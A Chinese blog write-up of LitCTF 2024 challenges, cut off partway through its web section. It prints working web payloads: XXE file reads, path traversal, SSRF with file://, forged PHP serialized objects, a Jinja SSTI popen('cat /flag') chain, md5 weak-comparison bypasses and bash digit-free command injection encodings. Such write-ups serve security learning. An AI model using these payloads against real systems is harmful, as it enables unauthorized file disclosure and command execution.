@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="好简单的比赛！主要是队友大佬，早上起床开个靶机去吃饭回来队友已经把web秒到只剩下一道题了（我开着靶机队友上不去）misc也快秒完了 后来我做了一下web，一共用时29分04秒77比队友慢了一点（）） 队里没有crypto reverse和pwn手，也没什么成绩，佬们凑合着看吧，轻点喷哈~ 队伍：L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF 2024 wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="好简单的比赛！主要是队友大佬，早上起床开个靶机去吃饭回来队友已经把web秒到只剩下一道题了（我开着靶机队友上不去）misc也快秒完了 后来我做了一下web，一共用时29分04秒77比队友慢了一点（）） 队里没有crypto reverse和pwn手，也没什么成绩，佬们凑合着看吧，轻点喷哈~ 队伍：L">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-01T14:21:00.000Z">
+<meta property="article:modified_time" content="2024-06-01T14:21:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>LitCTF 2024 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-04-26-xyctf-2024-web-week1-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&text=LitCTF 2024 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&is_video=false&description=LitCTF 2024 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LitCTF 2024 wp&body=Check out this article: https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&title=LitCTF 2024 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&name=LitCTF 2024 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-01-litctf-2024-wp/&t=LitCTF 2024 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exx"><span class="toc-number">1.1.</span> <span class="toc-text">exx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98-%E5%88%92%E6%8E%89-%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">高亮主题(划掉)背景查看器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%9F%E8%83%BD%E5%A5%97%E5%A8%83"><span class="toc-number">1.3.</span> <span class="toc-text">浏览器也能套娃?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAS-Serializing-Authentication-System"><span class="toc-number">1.4.</span> <span class="toc-text">SAS - Serializing Authentication System</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E2%80%A6-%E6%B1%A0%E5%AD%90%EF%BC%9F"><span class="toc-number">1.5.</span> <span class="toc-text">一个….池子？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E4%B8%87%E7%BE%8E%E9%87%91%E7%9A%84%E8%AF%B1%E6%83%91"><span class="toc-number">1.6.</span> <span class="toc-text">百万美金的诱惑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">2.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">2.1.</span> <span class="toc-text">ez_python!!!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%96%B5"><span class="toc-number">2.2.</span> <span class="toc-text">编码喵</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#small-e"><span class="toc-number">3.1.</span> <span class="toc-text">small_e</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#common-primes"><span class="toc-number">3.2.</span> <span class="toc-text">common_primes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRT"><span class="toc-number">3.3.</span> <span class="toc-text">CRT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#little-fermet"><span class="toc-number">3.4.</span> <span class="toc-text">little_fermet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B6%90%E8%B4%AA%E6%81%8B%E5%92%8C%E4%BC%B1%E3%80%81%E7%94%BE%E2%80%95%E2%91%BAde%E6%AF%8E%E5%85%AE%E6%AF%8E%E7%A7%92"><span class="toc-number">4.1.</span> <span class="toc-text">涐贪恋和伱、甾―⑺dé毎兮毎秒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E8%AF%B4%E5%BE%97%E5%AF%B9%EF%BC%8C%E4%BD%86"><span class="toc-number">4.2.</span> <span class="toc-text">你说得对，但__</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E9%93%81%EF%BC%8C%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="toc-number">4.3.</span> <span class="toc-text">原铁，启动！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AF%E5%B8%A7%E7%8F%8D%E7%8F%A0"><span class="toc-number">4.4.</span> <span class="toc-text">盯帧珍珠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Everywhere-We-Go"><span class="toc-number">4.5.</span> <span class="toc-text">Everywhere We Go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%88%94%E5%88%B0%E6%9C%80%E5%90%8E%E5%BA%94%E6%9C%89%E5%B0%BD%E6%9C%89"><span class="toc-number">4.6.</span> <span class="toc-text">舔到最后应有尽有</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%EF%BC%8C%E5%A4%AA%E5%85%B3%E9%94%AE%E4%BA%86"><span class="toc-number">4.7.</span> <span class="toc-text">关键，太关键了!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B3%E8%A3%85%E7%85%A7%E6%B5%81%E9%87%8F"><span class="toc-number">4.8.</span> <span class="toc-text">女装照流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-love"><span class="toc-number">4.9.</span> <span class="toc-text">The love</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        LitCTF 2024 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-01T14:21:00.000Z" class="dt-published" itemprop="datePublished">2024-06-01</time>
+        
+        (Updated: <time datetime="2024-06-01T14:21:00.000Z" class="dt-updated" itemprop="dateModified">2024-06-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>好简单的比赛！主要是队友大佬，早上起床开个靶机去吃饭回来队友已经把web秒到只剩下一道题了（我开着靶机队友上不去）misc也快秒完了</p>
+<p>后来我做了一下web，一共用时29分04秒77比队友慢了一点（））</p>
+<p>队里没有crypto reverse和pwn手，也没什么成绩，佬们凑合着看吧，轻点喷哈~</p>
+<p>队伍：LamentA 排位：67<br>队伍成员：<br>LamentXU<br>Leif9964<br>sanmu1<br>ababab</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">web(ak)</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">exx</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">高亮主题(划掉)背景查看器</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">浏览器也能套娃？</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">SAS - Serializing Authentication System</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">一个….池子？</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.6">百万美金的诱惑</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2">reverse</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.1">ezpython!!!!</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#2.2">编码喵</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3">crypto</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.1">small_e</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.2">common_primes</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.3">CRT</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#3.4">little_femert</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4">misc(ak)</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.1">涐贪恋和伱、甾―⑺dé毎兮毎秒</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.2">你说得对，但__</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.3">原铁，启动！</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.4">盯帧珍珠</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.5">Everywhere We Go</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.6">舔到最后应有尽有</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.7">关键，太关键了!</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.8">女装照流量</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#4.9">The love</a></li>
+</ul>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#5">写在后面</a></strong></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h2><p>xml实体注入。题目的名称或者抓包都可以看出来。</p>
+<p>原理的话就不说了。</p>
+<p><code>DTD</code>定义合法的xml文档：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**内部声明DTD** </span><br><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line">**引用外部DTD** </span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>带有dtd的xml文档实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内部声明实体</span><br><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">**引用外部实体**</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br><span class="line">或者：</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里定义了一个名为b的实体，它被引用了一个系统命令：<code>php://filter/convert.base64-encode/resource=/flag</code></p>
+<p>当然这是php环境。然后根据一般情况下的回显：把回显位置换成定义的实体b。如果正确解析的话就插入到了指定位置。</p>
+<h2 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h2><p>直接梭哈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme=../../../../flag</span><br></pre></td></tr></table></figure>
+
+<p>这一题其实注入点很好玩。注入点不是显示出来的<code>url</code>，而是点击<code>Use this theme</code>之后产生的反应：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: node3.anna.nssctf.cn:28296</span><br><span class="line">Content-Length: 16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://node3.anna.nssctf.cn:28296</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node3.anna.nssctf.cn:28296/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">theme=theme1.php</span><br></pre></td></tr></table></figure>
+
+<p>注入点显而易见，根据报错信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning&lt;/b&gt;:  include(themes//flag): failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p>也就是说文件目录被拼接了一个<code>theme</code></p>
+<p>所以直接梭哈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme=../../../../flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="浏览器也能套娃"><a href="#浏览器也能套娃" class="headerlink" title="浏览器也能套娃?"></a>浏览器也能套娃?</h2><p>SSRF</p>
+<p>直接使用伪协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h2><p>直接梭哈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line"></span><br><span class="line">    public $username;</span><br><span class="line"></span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    function __construct($username, $password) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line"></span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isValid() &#123; return $this-&gt;username === &#x27;admin&#x27; &amp;&amp; $this-&gt;password === &#x27;secure_password&#x27;; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pay=new User(&quot;admin&quot;,&quot;secure_password&quot;);</span><br><span class="line">echo base64_encode(serialize($pay));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h2><p>根据返回报文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.3 Python/3.10.14</span><br><span class="line">Date: Sat, 01 Jun 2024 03:55:39 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 1340</span><br><span class="line">Connection: </span><br></pre></td></tr></table></figure>
+
+<p>可以看出来这是一个python写的后端，尝试SSTI:</p>
+<p>直接梭哈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[137].__init__.__globals__[&quot;popen&quot;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="百万美金的诱惑"><a href="#百万美金的诱惑" class="headerlink" title="百万美金的诱惑"></a>百万美金的诱惑</h2><p>这一题很有意思。第一关：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">if ($a !== $b &amp;&amp; md5($a) == md5($b)) &#123;</span><br><span class="line">        if (!is_numeric($c) &amp;&amp; $c &gt; 2024) &#123;</span><br><span class="line">            echo &quot;好康的&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;干巴爹干巴爹先辈~&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">else &#123;</span><br><span class="line">    die(&quot;开胃小菜))&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弱比较：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?a[]=1&amp;b[]=2&amp;c=2525b</span><br></pre></td></tr></table></figure>
+
+<p>第二关：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//flag in 12.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;x&#x27;]))&#123;</span><br><span class="line">    $x = $_GET[&#x27;x&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;, $x))&#123;</span><br><span class="line">            system(&quot;cat &quot;.$x.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bash构造无数字字符的命令。</p>
+<p>我构造的双展开形式的<code>${}${}</code>在bash中可以执行，但是在php中执行不了。</p>
+<p>后来看bash扩展的时候，看到了一个很抽象的东西：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;$(())&#x27;,  # 0</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))))))&#x27;,  # 1</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 2</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 3</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 4</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 5</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 6</span><br><span class="line">&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  # 7</span><br></pre></td></tr></table></figure>
+
+<p>按照这个逻辑直接构造12：</p>
